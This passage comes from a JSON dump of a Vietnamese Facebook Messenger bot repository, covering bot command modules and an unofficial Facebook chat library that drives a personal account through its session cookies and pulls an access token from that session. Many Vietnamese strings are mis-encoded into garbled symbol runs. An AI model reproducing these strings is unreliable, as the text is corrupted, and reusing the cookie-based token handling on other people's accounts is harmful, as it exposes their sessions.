global.config.commandDisabled.splice(global.config.commandDisabled.indexOf(nameModule + '.js'), 1))\n          global.client.commands.set(command.config.name, command)\n          logger.loader('Loaded command ' + command.config.name + '!');\n      } catch (error) {\n          errorList.push('- ' + nameModule + ' reason:' + error + ' at ' + error['stack']);\n      };\n  }\n  if (errorList.length != 0) api.sendMessage('¬ª ùêçùê°ùêÆÃõÃÉùêßùê† ùê•ùêûÃ£ÃÇùêßùê° ùêõùê¢Ã£ ùê•ùê®ÃÇÃÉùê¢ ùê§ùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê≠ùêöÃâùê¢ ' + errorList.join(' '), threadID, messageID);\n  api.sendMessage('¬ª ùêïùêÆÃõÃÄùêö ùê≠ùêöÃâùê¢ ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ' + (moduleList.length - errorList.length) + ' ùê•ùêûÃ£ÃÇùêßùê° üíï', threadID, messageID) \n  writeFileSync(configPath, JSON.stringify(configValue, null, 4), 'utf8')\n  unlinkSync(configPath + '.temp');\n  return;\n}\n\nconst unloadModule = function ({ moduleList, threadID, messageID }) {\n  const { writeFileSync, unlinkSync } = global.nodemodule[\"fs-extra\"];\n  const { configPath, mainPath, api } = global.client;\n  const logger = require(mainPath + \"/utils/log\").loader;\n\n  delete require.cache[require.resolve(configPath)];\n  var configValue = require(configPath);\n  writeFileSync(configPath + \".temp\", JSON.stringify(configValue, null, 4), 'utf8');\n\n  for (const nameModule of moduleList) {\n      global.client.commands.delete(nameModule);\n      global.client.eventRegistered = global.client.eventRegistered.filter(item => item !== nameModule);\n      configValue[\"commandDisabled\"].push(`${nameModule}.js`);\n      global.config[\"commandDisabled\"].push(`${nameModule}.js`);\n      logger(`Unloaded command ${nameModule}!`);\n  }\n\n  writeFileSync(configPath, JSON.stringify(configValue, null, 4), 'utf8');\n  unlinkSync(configPath + \".temp\");\n\n  return api.sendMessage(`¬ª ùêìùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê† ùê°ùêÆÃâùê≤ ${moduleList.length} ùê•ùêûÃ£ÃÇùêßùê° ‚ú®`, threadID, messageID);\n}\n\nmodule.exports.run = function ({ event, args, api }) {\n\n    if (!global.config.ADMINBOT.includes(event.senderID.toString())) {\n        return api.sendMessage(`¬ª ùêÅùêöÃ£ùêß ùê§ùê°ùê®ÃÇùêßùê† ùêúùê®ÃÅ ùê™ùêÆùê≤ùêûÃÇÃÄùêß`, event.threadID, event.messageID);\n    }\n\n  const { readdirSync } = global.nodemodule[\"fs-extra\"];\n  const { threadID, messageID } = event;\n\n  var moduleList = args.splice(1, args.length);\n\n  switch (args[0]) {\n    case \"count\": {\n    let commands = client.commands.values();\n    let infoCommand = \"\";\n    api.sendMessage(\"¬ª ùêáùê¢ùêûùêß ùê≠ùêöùê¢ ùêúùê® \" + client.commands.size + \" ùêãùêûÃ£ÃÇùêßùê° ùêúùê®ÃÅ ùê≠ùê°ùêûÃÇÃâ ùê¨ùêÆÃõÃâ ùêùùêÆÃ£ùêßùê† üíå\"+ infoCommand, event.threadID, event.messageID);\n    break;\n  }\n      case \"load\": {\n          if (moduleList.length == 0) return api.sendMessage(\"¬ª ùêìùêûÃÇùêß ùê¶ùê®ùêùùêÆùê•ùêû ùê§ùê°ùê®ÃÇùêßùê† ùêùùêÆÃõùê®ÃõÃ£ùêú ùê©ùê°ùêûÃÅùê© ùêõùê¢Ã£ ùê≠ùê´ùêÆÃÄùêßùê† ‚ö†Ô∏è\", threadID, messageID);\n          else return loadCommand({ moduleList, threadID, messageID });\n      }\n      case \"unload\": {\n          if (moduleList.length == 0) return api.sendMessage(\"¬ª ùêìùêûÃÇùêß ùê¶ùê®ùêùùêÆùê•ùêû ùê§ùê°ùê®ÃÇùêßùê† ùêùùêÆÃõùê®ÃõÃ£ùêú ùê©ùê°ùêûÃÅùê© ùêõùê¢Ã£ ùê≠ùê´ùêÆÃÄùêßùê† ‚ö†Ô∏è\", threadID, messageID);\n          else return unloadModule({ moduleList, threadID, messageID });\n      }\n      case \"loadAll\": {\n          moduleList = readdirSync(__dirname).filter((file) => file.endsWith(\".js\") && !file.includes('example'));\n          moduleList = moduleList.map(item => item.replace(/\\.js/g, \"\"));\n          return loadCommand({ moduleList, threadID, messageID });\n      }\n      case \"unloadAll\": {\n          moduleList = readdirSync(__dirname).filter((file) => file.endsWith(\".js\") && !file.includes('example') && !file.includes(\"command\"));\n          moduleList = moduleList.map(item => item.replace(/\\.js/g, \"\"));\n          return unloadModule({ moduleList, threadID, messageID });\n      }\n      case \"info\": {\n          const command = global.client.commands.get(moduleList.join(\"\") || \"\");\n\n          if (!command) return api.sendMessage(\"¬ª ùêåùê®ùêùùêÆùê•ùêû ùêõùêöÃ£ùêß ùêßùê°ùêöÃ£ÃÇùê© ùê§ùê°ùê®ÃÇùêßùê† ùê≠ùê®ÃÇÃÄùêß ùê≠ùêöÃ£ùê¢ ‚ö†Ô∏è\", threadID, messageID);\n\n          const { name, version, hasPermssion, credits, cooldowns, dependencies } = command.config;\n\n          return api.sendMessage(\n              \"=== \" + name.toUpperCase() + \" ===\\n\" +\n              \"- ƒê∆∞·ª£c code b·ªüi: \" + credits + \"\\n\" +\n              \"- Phi√™n b·∫£n: \" + version + \"\\n\" +\n              \"- Y√™u c·∫ßu quy·ªÅn h·∫°n: \" + ((hasPermssion == 0) ? \"Ng∆∞·ªùi d√πng\" : (hasPermssion == 1) ? \"Qu·∫£n tr·ªã vi√™n\" : \"Ng∆∞·ªùi v·∫≠n h√†nh bot\" ) + \"\\n\" +\n              \"- Th·ªùi gian ch·ªù: \" + cooldowns + \" gi√¢y(s)\\n\" +\n              `- C√°c package y√™u c·∫ßu: ${(Object.keys(dependencies || {})).join(\", \") || \"Kh√¥ng c√≥\"}`,\n              threadID, messageID\n          );\n      }\n      default: {\n          return global.utils.throwError(this.config.name, threadID, messageID);\n      }\n  }\n                                     }\n","path":null,"size_bytes":11726,"size_tokens":null},"modules/commands/sendmsg.js":{"content":"module.exports.config = {\n\tname: \"sendmsg\",\n\tversion: \"1.0.7\",\n\thasPermssion: 3,\n\tcredits: \"TatsuYTB\", \n\tdescription: \"G·ª≠i tin nh·∫Øn ƒë·∫øn nh√≥m b·∫±ng ID!\",\n\tcommandCategory: \"H·ªá Th·ªëng\",\n\tusages: \"ID [Text]\",\n\tcooldowns: 5\n};\n\n\tmodule.exports.run = async ({ api, event, args, getText, utils, Users }) => {\n    const moment = require(\"moment-timezone\");\n      var gio = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH:mm:s || DD/MM/YYYY\");\n\t\tvar idbox = args[0];\n\t\tvar reason = args.slice(1);\n    let name = await Users.getNameUser(event.senderID)\n\t\tif (args.length == 0) api.sendMessage(\"ùêíùêÆÃõÃâ ùêùùêÆÃ£ùêßùê† #ùê¨ùêûùêßùêùùê¶ùê¨ùê† ùêàùêÉ_ùêÅùêéùêó ùêçùê®Ã£ÃÇùê¢ ùêÉùêÆùêßùê†\", event.threadID, event.messageID);\n\telse \n\t    if(reason == \"\")api.sendMessage(\"ùêíùêÆÃõÃâ ùêùùêÆÃ£ùêßùê† #ùê¨ùêûùêßùêùùê¶ùê¨ùê† ùêàùêÉ_ùêÅùêéùêó ùêçùê®Ã£ÃÇùê¢ ùêÉùêÆùêßùê†\", event.threadID, event.messageID);\n\t\tif (event.type == \"message_reply\") {\n\t\t\tconst request = global.nodemodule[\"request\"];\n\t\t\tconst fs = require('fs')\n\t\t\tconst axios = require('axios')  \n\t\t\tvar getURL = await request.get(event.messageReply.attachments[0].url);\n\t\t\t\n\t\t\t\t\tvar pathname = getURL.uri.pathname;\n\t\t\t\n\t\t\t\t\tvar ext = pathname.substring(pathname.lastIndexOf(\".\") + 1);\n\t\t\t\n\t\t\t\t\tvar path = __dirname + `/cache/snoti`+`.${ext}`;\n\t\t\t\n\t\t\t\n\t\t\tvar abc = event.messageReply.attachments[0].url;\n\t\t\t\tlet getdata = (await axios.get(`${abc}`, { responseType: 'arraybuffer' })).data;\n\t\t\t\n\t\t\t  fs.writeFileSync(path, Buffer.from(getdata, 'utf-8'));\t\n\tawait api.sendMessage({body: `„Äå ùêÄùêÉùêåùêàùêç ùêíùêÑùêçùêÉ ùêçùêéùêìùêà ùêìùêé ùêòùêéùêîùêë ùêÜùêëùêéùêîùêè „Äç\\n‚ûù ùêïùêöÃÄùê® ùêãùêÆÃÅùêú: ${gio}\\n‚ûù ùêÄùêÉùêåùêàùêç: ${name}\\n--------------- ùêçùê®Ã£ÃÇùê¢ ùêÉùêÆÃÄùêßùê† ---------------\\n` + reason.join(\" \"), attachment: fs.createReadStream(path) }, idbox, () =>\n\t\t\tapi.sendMessage(`${api.getCurrentUserID()}`, () =>\n\t\t\t\tapi.sendMessage(\"ùêÉùêöÃÉ ùê†ùêÆÃõÃâùê¢ ùê•ùê®ÃõÃÄùê¢ ùêßùê°ùêöÃÜÃÅùêß!: \" + reason.join(\" \"), event.threadID)));\n} \nelse {\n\t\tawait api.sendMessage(`„Äå ùêÄùêÉùêåùêàùêç ùêíùêÑùêçùêÉ ùêçùêéùêìùêà ùêìùêé ùêòùêéùêîùêë ùêÜùêëùêéùêîùêè „Äç\\n‚ûù ùêïùêöÃÄùê® ùêãùêÆÃÅùêú: ${gio}\\n‚ûù ùêÄùêÉùêåùêàùêç: ${name}\\n--------------- ùêçùê®Ã£ÃÇùê¢ ùêÉùêÆÃÄùêßùê† ---------------\\n` + reason.join(\" \"), idbox, () =>\n\t\t\tapi.sendMessage(`${api.getCurrentUserID()}`, () =>\n\t\t\t\tapi.sendMessage(\"ùêÉùêöÃÉ ùê†ùêÆÃõÃâùê¢ ùê•ùê®ÃõÃÄùê¢ ùêßùê°ùêöÃÜÃÅùêß!: \" + reason.join(\" \"), event.threadID)));\n\n\t}\n}","path":null,"size_bytes":2618,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeGroupImage.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\nvar bluebird = require(\"bluebird\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  function handleUpload(image, callback) {\n    var uploads = [];\n\n    var form = {\n      images_only: \"true\",\n      \"attachment[]\": image\n    };\n\n    uploads.push(\n      defaultFuncs\n        .postFormData(\"https://upload.facebook.com/ajax/mercury/upload.php\", ctx.jar, form, {})\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function (resData) {\n          if (resData.error) throw resData;\n\n          return resData.payload.metadata[0];\n        })\n    );\n\n    // resolve all promises\n    bluebird\n      .all(uploads)\n      .then(resData => callback(null, resData))\n      .catch(function (err) {\n        log.error(\"handleUpload\", err);\n        return callback(err);\n      });\n  }\n\n  return function changeGroupImage(image, threadID, callback) {\n    if (!callback && (utils.getType(threadID) === \"Function\" || utils.getType(threadID) === \"AsyncFunction\")) throw { error: \"please pass a threadID as a second argument.\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var messageAndOTID = utils.generateOfflineThreadingID();\n    var form = {\n      client: \"mercury\",\n      action_type: \"ma-type:log-message\",\n      author: \"fbid:\" + ctx.userID,\n      author_email: \"\",\n      ephemeral_ttl_mode: \"0\",\n      is_filtered_content: false,\n      is_filtered_content_account: false,\n      is_filtered_content_bh: false,\n      is_filtered_content_invalid_app: false,\n      is_filtered_content_quasar: false,\n      is_forward: false,\n      is_spoof_warning: false,\n      is_unread: false,\n      log_message_type: \"log:thread-image\",\n      manual_retry_cnt: \"0\",\n      message_id: messageAndOTID,\n      offline_threading_id: messageAndOTID,\n      source: \"source:chat:web\",\n      \"source_tags[0]\": \"source:chat\",\n      status: \"0\",\n      thread_fbid: threadID,\n      thread_id: \"\",\n      timestamp: Date.now(),\n      timestamp_absolute: \"Today\",\n      timestamp_relative: utils.generateTimestampRelative(),\n      timestamp_time_passed: \"0\"\n    };\n\n    handleUpload(image, function (err, payload) {\n      if (err) return callback(err);\n\n      form[\"thread_image_id\"] = payload[0][\"image_id\"];\n      form[\"thread_id\"] = threadID;\n\n      defaultFuncs\n        .post(\"https://www.facebook.com/messaging/set_thread_image/\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function (resData) {\n          // check for errors here\n          if (resData.error) throw resData;\n          return callback();\n        })\n        .catch(function (err) {\n          log.error(\"changeGroupImage\", err);\n          return callback(err);\n        });\n    });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":3093,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/Step_3.js":{"content":"'use strict';\n\nconst crypto = require('crypto');\nconst aes = require(\"aes-js\");\n\nmodule.exports.encryptState = function encryptState(data, key) {\n    let hashEngine = crypto.createHash(\"sha256\");\n    let hashKey = hashEngine.update(key).digest();\n    let bytes = aes.utils.utf8.toBytes(data);\n    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);\n    let encryptedData = aesCtr.encrypt(bytes);\n    return aes.utils.hex.fromBytes(encryptedData);\n};\n\nmodule.exports.decryptState = function decryptState(data, key) {\n    let hashEngine = crypto.createHash(\"sha256\");\n    let hashKey = hashEngine.update(key).digest();\n    let encryptedBytes = aes.utils.hex.toBytes(data);\n    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);\n    let decryptedData = aesCtr.decrypt(encryptedBytes);\n    return aes.utils.utf8.fromBytes(decryptedData);\n};\n","path":null,"size_bytes":836,"size_tokens":null},"lib/fca-auto/src/getAccessToken.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getAccessToken(callback) {\n      var resolveFunc = function () { };\n      var rejectFunc = function () { };\n      var returnPromise = new Promise(function (resolve, reject) {\n        resolveFunc = resolve;\n        rejectFunc = reject;\n      });\n  \n      if (!callback) {\n        callback = function (err, userInfo) {\n          if (err) return rejectFunc(err);\n          resolveFunc(userInfo);\n        };\n      }\n    try {\n      var { getAccessToken } = require('../Extra/ExtraAddons');\n      getAccessToken(ctx.jar,ctx,defaultFuncs).then(data => callback(null,data));\n    }\n    catch (e) {\n      callback(null, e);\n    }\n    return returnPromise;\n    };\n  };","path":null,"size_bytes":783,"size_tokens":null},"lib/fca-auto/src/sendTypingIndicator.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  function makeTypingIndicator(typ, threadID, callback, isGroup) {\n    var form = {\n      typ: +typ,\n      to: \"\",\n      source: \"mercury-chat\",\n      thread: threadID\n    };\n\n    // Check if thread is a single person chat or a group chat\n    // More info on this is in api.sendMessage\n    if (utils.getType(isGroup) == \"Boolean\") {\n      if (!isGroup) {\n        form.to = threadID;\n      }\n      defaultFuncs\n        .post(\"https://www.facebook.com/ajax/messaging/typ.php\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function (resData) {\n          if (resData.error) throw resData;\n          return callback();\n        })\n        .catch(function (err) {\n          log.error(\"sendTypingIndicator\", err);\n          if (utils.getType(err) == \"Object\" && err.error === \"Not logged in\") {\n            ctx.loggedIn = false;\n          }\n          return callback(err);\n        });\n    }\n    else {\n      api.getUserInfo(threadID, function (err, res) {\n        if (err) return callback(err);\n        // If id is single person chat\n        if (Object.keys(res).length > 0) form.to = threadID;\n        defaultFuncs\n          .post(\"https://www.facebook.com/ajax/messaging/typ.php\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(function (resData) {\n            if (resData.error) throw resData;\n            return callback();\n          })\n          .catch(function (err) {\n            log.error(\"sendTypingIndicator\", err);\n            if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n            return callback(err);\n          });\n      });\n    }\n  }\n\n  return function sendTypingIndicator(threadID, callback, isGroup) {\n    if (\n      utils.getType(callback) !== \"Function\" &&\n      utils.getType(callback) !== \"AsyncFunction\"\n    ) {\n      if (callback) log.warn(\"sendTypingIndicator\", \"callback is not a function - ignoring.\");\n      callback = () => { };\n    }\n\n    makeTypingIndicator(true, threadID, callback, isGroup);\n\n    return function end(cb) {\n      if (\n        utils.getType(cb) !== \"Function\" &&\n        utils.getType(cb) !== \"AsyncFunction\"\n      ) {\n        if (cb) log.warn(\"sendTypingIndicator\", \"callback is not a function - ignoring.\");\n        cb = () => { };\n      }\n\n      makeTypingIndicator(false, threadID, cb, isGroup);\n    };\n  };\n};\n","path":null,"size_bytes":2522,"size_tokens":null},"modules/commands/jokencc.js":{"content":"const axios = require('axios');\nconst translate = require('google-translate-api-x');\n\nmodule.exports.config = {\n    name: 'jokencc',\n    version: '1.0.0',\n    hasPermssion: 0,\n    credits: 'Your Name',\n    description: 'K·ªÉ chuy·ªán c∆∞·ªùi nh∆∞ng kh√¥ng c∆∞·ªùi',\n    commandCategory: 'Tr√≤ Ch∆°i',\n    usages: '',\n    cooldowns: 5,\n};\n\nmodule.exports.run = async function({ api, event }) {\n    const threadID = event.threadID;\n\n    try {\n        const response = await axios.get('https://official-joke-api.appspot.com/random_joke');\n        const joke = response.data;\n\n        const originalJoke = `\n${joke.setup}\n\n${joke.punchline}\n        `.trim();\n\n        const translatedJoke = await translate(originalJoke, { from: 'en', to: 'vi' });\n\n        api.sendMessage(translatedJoke.text, threadID);\n    } catch (error) {\n        console.error('C√≥ l·ªói x·∫£y ra:', error);\n        api.sendMessage('C√≥ l·ªói x·∫£y ra khi l·∫•y ho·∫∑c d·ªãch c√¢u chuy·ªán c∆∞·ªùi. Vui l√≤ng th·ª≠ l·∫°i sau.', threadID);\n    }\n};\n","path":null,"size_bytes":1016,"size_tokens":null},"lib/fca-auto/src/setPostReaction.js":{"content":"/**\n * @fix by NTKhang\n * update as Thursday, 10 February 2022\n * do not remove the author name to get more updates\n */\n\n \"use strict\";\n\n var utils = require(\"../utils\");\n var log = require(\"npmlog\");\n \n function formatData(resData) {\n   return {\n     viewer_feedback_reaction_info: resData.feedback_react.feedback.viewer_feedback_reaction_info,\n     supported_reactions: resData.feedback_react.feedback.supported_reactions,\n     top_reactions: resData.feedback_react.feedback.top_reactions.edges,\n     reaction_count: resData.feedback_react.feedback.reaction_count\n   };\n }\n \n module.exports = function(defaultFuncs, api, ctx) {\n   return function setPostReaction(postID, type, callback) {\n     var resolveFunc = function(){};\n     var rejectFunc = function(){};\n     var returnPromise = new Promise(function (resolve, reject) {\n       resolveFunc = resolve;\n       rejectFunc = reject;\n     });\n \n     if (!callback) {\n       if (utils.getType(type) === \"Function\" || utils.getType(type) === \"AsyncFunction\") {\n         callback = type;\n         type = 0;\n       }\n       else {\n         callback = function (err, data) {\n           if (err) {\n             return rejectFunc(err);\n           }\n           resolveFunc(data);\n         };\n       }\n     }\n \n     var map = {\n       unlike: 0,\n       like: 1,\n       heart: 2,\n       love: 16,\n       haha: 4,\n       wow: 3,\n       sad: 7,\n       angry: 8\n     };\n     \n     if (utils.getType(type) !== \"Number\" && utils.getType(type) === \"String\") {\n       type = map[type.toLowerCase()];\n     }\n     else {\n       throw {\n         error: \"setPostReaction: Invalid reaction type\"\n       };\n     }\n     \n     var form = {\n       av: ctx.userID,\n       fb_api_caller_class: \"RelayModern\",\n       fb_api_req_friendly_name: \"CometUFIFeedbackReactMutation\",\n       doc_id: \"4769042373179384\",\n       variables: JSON.stringify({\n         input: {\n           actor_id: ctx.userID,\n           feedback_id: (new Buffer.from(\"feedback:\" + postID)).toString(\"base64\"),\n           feedback_reaction: type,\n           feedback_source: \"OBJECT\",\n           is_tracking_encrypted: true,\n           tracking: [],\n           session_id: \"f7dd50dd-db6e-4598-8cd9-561d5002b423\",\n           client_mutation_id: Math.round(Math.random() * 19).toString()\n         },\n         useDefaultActor: false,\n         scale: 3\n       })\n     };\n \n     defaultFuncs\n       .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n       .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n       .then(function(resData) {\n         if (resData.errors) {\n           throw resData;\n         }\n         return callback(null, formatData(resData.data));\n       })\n       .catch(function(err) {\n         log.error(\"setPostReaction\", err);\n         return callback(err);\n       });\n \n     return returnPromise;\n   };\n };","path":null,"size_bytes":2832,"size_tokens":null},"modules/commands/unban.js":{"content":"\nmodule.exports.config = {\n  name: \"unban\",\n  version: \"1.0.0\",\n  hasPermssion: 3,\n  credits: \"ManhG\",//Mod by H.Thanh\n  description: \"G·ª° ban nh√≥m v√† ng∆∞·ªùi d√πng trong 1 n·ªët nh·∫°c\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"unban\",\n  cooldowns: 2,\n  denpendencies: {}\n};\n\nmodule.exports.run = async ({ event, api, Users, Threads, args }) => {\n  var { threadID, messageID, senderID } = event;\n\n  const { commands } = global.client;\n  const command = commands.get((\"unban\").toLowerCase());\n  const credit = command.config.credits;\n  var mangG = \"ManhG\";\n  if(credit != mangG) return api.sendMessage(`Sai credit!`, event.threadID, event.messageID);\n\n  const threadSetting = global.data.threadData.get(parseInt(event.threadID)) || {};\n  const prefix = (threadSetting.hasOwnProperty(\"PREFIX\")) ? threadSetting.PREFIX : global.config.PREFIX;\n\n  switch (args[0]) {\n    case 'admin':\n    case 'ad':\n      {\n        const listAdmin = global.config.ADMINBOT;\n        for (var idad of listAdmin) {\n          const data = (await Users.getData(idad)).data || {};\n          data.banned = 0;\n          data.reason = null;\n          data.dateAdded = null;\n          await Users.setData(idad, { data });\n          global.data.userBanned.delete(idad, 1);\n        }\n        api.sendMessage(\"[üòΩ]‚ûú ƒê√£ g·ª° ban cho to√†n b·ªô Admin Bot\", threadID, messageID)\n        break;\n      }\n\n    case 'ndh':\n      {\n        const listNDH = global.config.NDH;\n        for (var idNDH of listNDH) {\n          const data = (await Users.getData(idNDH)).data || {};\n          data.banned = 0;\n          data.reason = null;\n          data.dateAdded = null;\n          await Users.setData(idNDH, { data });\n          global.data.userBanned.delete(idNDH, 1);\n        }\n        api.sendMessage(\"[üòΩ]‚ûú ƒê√£ g·ª° ban cho to√†n b·ªô Ng∆∞·ªùi h·ªó tr·ª£\", threadID, messageID)\n        break;\n      }\n\n\n    case 'allbox':\n    case 'allthread':\n      {\n        const threadBanned = global.data.threadBanned.keys();\n        for (const singleThread of threadBanned) {\n          const data = (await Threads.getData(singleThread)).data || {};\n          data.banned = 0;\n          data.reason = null;\n          data.dateAdded = null;\n          await Threads.setData(singleThread, { data });\n          global.data.userBanned.delete(singleThread, 1);\n        }\n        api.sendMessage(\"[üòΩ]‚ûú ƒê√£ g·ª° ban cho to√†n nh√≥m tr√™n server\", threadID, messageID)\n        break;\n      }\n\n    case 'box':\n    case 'thread':\n      {\n        var idbox = event.threadID;\n        var data = (await Threads.getData(idbox)).data || {};\n        data.banned = 0;\n        data.reason = null;\n        data.dateAdded = null;\n        await Threads.setData(idbox, { data });\n        global.data.userBanned.delete(idbox, 1);\n        api.sendMessage(\"[üòΩ]‚ûú ƒê√£ g·ª° ban cho nh√≥m n√†y\", threadID, messageID)\n        break;\n      }\n\n    case 'allmember':\n    case 'alluser':\n      {\n        const userBanned = global.data.userBanned.keys();\n        for (const singleUser of userBanned) {\n          const data = (await Users.getData(singleUser)).data || {};\n          data.banned = 0;\n          data.reason = null;\n          data.dateAdded = null;\n          await Users.setData(singleUser, { data });\n          global.data.userBanned.delete(singleUser, 1);\n        }\n        api.sendMessage(\"[üòΩ]‚ûú ƒê√£ g·ª° ban cho to√†n b·ªô ng∆∞·ªùi d√πng tr√™n server\", threadID, messageID)\n        break;\n      }\n\n    case 'qtvall':\n    case 'Qtvall':\n    case 'allqtv':\n      {\n        var data = [];\n        data = await Threads.getAll();\n\n        for (let i = 0; i < data.length; i++) {\n          const idAdmins = (data[i].threadInfo).adminIDs;\n          for (let i = 0; i < idAdmins.length; i++) {\n            const idad = idAdmins[i].id;\n\n            const data = (await Users.getData(idad)).data || {};\n            data.banned = 0;\n            data.reason = null;\n            data.dateAdded = null;\n            await Users.setData(idad, { data });\n            global.data.userBanned.delete(idad, 1);\n          }\n        }\n        api.sendMessage('[üòΩ]‚ûú ƒê√£ g·ª° ban cho to√†n b·ªô Qu·∫£n tr·ªã vi√™n tr√™n server', threadID, messageID);\n        break;\n      }\n\n    case 'qtv':\n    case 'Qtv':\n      {\n        //var threadInfo = await api.getThreadInfo(event.threadID);\n        var threadInfo = (await Threads.getData(event.threadID)).threadInfo;\n        var listQTV = threadInfo.adminIDs;\n        for (let i = 0; i < listQTV.length; i++) {\n          const idQtv = listQTV[i].id;\n          const data = (await Users.getData(idQtv)).data || {};\n          data.banned = 0;\n          data.reason = null;\n          data.dateAdded = null;\n          await Users.setData(idQtv, { data });\n          global.data.userBanned.delete(idQtv, 1);\n        }\n        api.sendMessage(\"[üòΩ]‚ûú ƒê√£ g·ª° ban cho to√†n b·ªô Qu·∫£n tr·ªã vi√™n nh√≥m n√†y\", threadID, messageID)\n        break;\n      }\n\n    case 'member':\n    case 'mb':\n    case 'user':\n      {\n        if (!args[1]) {\n         // var threadInfo = await api.getThreadInfo(event.threadID);\n          //var threadInfo = (await Threads.getData(event.threadID)).threadInfo;\n          var listMember = event.participantIDs;\n          for (let i = 0; i < listMember.length; i++) {\n            const idMember = listMember[i];\n            const data = (await Users.getData(idMember)).data || {};\n            data.banned = 0;\n            data.reason = null;\n            data.dateAdded = null;\n            await Users.setData(idMember, { data });\n            global.data.userBanned.delete(idMember, 1);\n          }\n          return api.sendMessage(\"[üòΩ]‚ûú ƒê√£ g·ª° ban cho to√†n b·ªô th√†nh vi√™n trong nh√≥m n√†y\", threadID, messageID);\n        }\n        if (args.join().indexOf('@') !== -1) {\n          var mentions = Object.keys(event.mentions)\n          var userID = (await Users.getData(mentions)).userID;\n          var nameUser = (await Users.getData(mentions)).name;\n          const data = (await Users.getData(userID)).data || {};\n          data.banned = 0;\n          data.reason = null;\n          data.dateAdded = null;\n          await Users.setData(userID, { data });\n          global.data.userBanned.delete(userID, 1);\n          return api.sendMessage(`[üòΩ]‚ûú Ng∆∞·ªùi d√πng ${nameUser} ƒë√£ ƒë∆∞·ª£c g·ª° ban`, threadID, messageID)\n        }\n        break;\n      }\n\n    default:\n      api.sendMessage(`[üòΩ] ùó®ùó°ùóïùóîùó° ùóñùó¢ùó°ùóôùóúùóö [üòΩ]\\n‚óÜ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚óÜ\\n\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùóÆùó±ùó∫ùó∂ùóª => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùòÅùóºùóÆÃÄùóª ùóØùóºÃ£ÃÇ ùóîùó±ùó∫ùó∂ùóª ùóïùóºùòÅ\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùóªùó±ùóµ => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùòÅùóºùóÆÃÄùóª ùóØùóºÃ£ÃÇ ùó°ùó¥ùòÇÃõùóºÃõÃÄùó∂ ùóµùóºÃÇÃÉ ùòÅùóøùóºÃõÃ£\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùóÆùóπùóπùóØùóºùòÖ => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùòÅùóºùóÆÃÄùóª ùóØùóºÃ£ÃÇ ùóªùóµùóºÃÅùó∫ ùòÅùóøùó≤ÃÇùóª ùòÄùó≤ùóøùòÉùó≤ùóø\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùóØùóºùòÖ => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùóªùóµùóºÃÅùó∫ ùóµùó∂ùó≤Ã£ÃÇùóª ùòÅùóÆÃ£ùó∂ ( ùü≠ ùóªùóµùóºÃÅùó∫ )\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùóÆùóπùóπùòÇùòÄùó≤ùóø => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùòÅùóºùóÆÃÄùóª ùóØùóºÃ£ÃÇ ùóªùó¥ùòÇÃõùóºÃõÃÄùó∂ ùó±ùòÇÃÄùóªùó¥ ùòÅùóøùó≤ÃÇùóª ùòÄùó≤ùóøùòÉùó≤ùóø\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùóÆùóπùóπùóæùòÅùòÉ => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùòÅùóºùóÆÃÄùóª ùóØùóºÃ£ÃÇ ùó§ùòÇùóÆÃâùóª ùòÅùóøùó∂Ã£ ùòÉùó∂ùó≤ÃÇùóª ùòÅùóøùó≤ÃÇùóª ùòÄùó≤ùóøùòÉùó≤ùóø\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùóæùòÅùòÉ => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùòÅùóºùóÆÃÄùóª ùóØùóºÃ£ÃÇ ùó§ùòÇùóÆÃâùóª ùòÅùóøùó∂Ã£ ùòÉùó∂ùó≤ÃÇùóª ( ùü≠ ùóªùóµùóºÃÅùó∫ )\\n[üëâ] - ùòÇùóªùóØùóÆùóª ùó∫ùó≤ùó∫ùóØùó≤ùóø => ùóöùóºÃõÃÉ ùóØùóÆùóª ùó∞ùóµùóº ùòÅùóºùóÆÃÄùóª 